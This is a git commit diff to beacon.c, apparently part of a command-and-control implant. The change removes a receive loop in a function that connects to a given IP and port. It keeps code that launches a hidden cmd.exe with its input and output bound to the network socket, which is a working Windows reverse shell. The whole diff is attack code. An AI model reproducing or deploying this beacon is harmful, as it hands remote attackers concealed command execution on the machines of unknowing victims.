2d42f91813ba22a1e5a235ba3dd5aa5c76d219fe
Yassir Laaouissi <yassirlaaouissi1@gmail.com>
2023-02-12 20:21:59 +0100

    why the while

--- beacon.c
+++ beacon.c
@@ -87,25 +87,25 @@ void beacon_connect_to_server(char IP[16], int PORT){
     
     
     // Receive until the peer closes the connection
-    do {
-        iResult = recv(s, recvbuf, recvbuflen, 0);
+    
+    iResult = recv(s, recvbuf, recvbuflen, 0);
 
-        // Executing commands
-        STARTUPINFO sinfo;
-	    memset(&sinfo, 0, sizeof(sinfo));
-        sinfo.cb = sizeof(sinfo);
-        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-        sinfo.hStdInput = (HANDLE)s;
-        sinfo.hStdOutput = (HANDLE)s;
-        sinfo.hStdError = (HANDLE)s;
-        PROCESS_INFORMATION pinfo;
-        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
-        WaitForSingleObject(pinfo.hProcess, INFINITE);
-        CloseHandle(pinfo.hProcess);
-        CloseHandle(pinfo.hThread);
-        memset((void *) s, 0, sizeof(s));
-        printf("HELP");
-    } while( iResult >= 0 );
+    // Executing commands
+    STARTUPINFO sinfo;
+    memset(&sinfo, 0, sizeof(sinfo));
+    sinfo.cb = sizeof(sinfo);
+    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    sinfo.hStdInput = (HANDLE)s;
+    sinfo.hStdOutput = (HANDLE)s;
+    sinfo.hStdError = (HANDLE)s;
+    PROCESS_INFORMATION pinfo;
+    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+    WaitForSingleObject(pinfo.hProcess, INFINITE);
+    CloseHandle(pinfo.hProcess);
+    CloseHandle(pinfo.hThread);
+    memset((void *) s, 0, sizeof(s));
+    printf("HELP");
+    
     
     
     
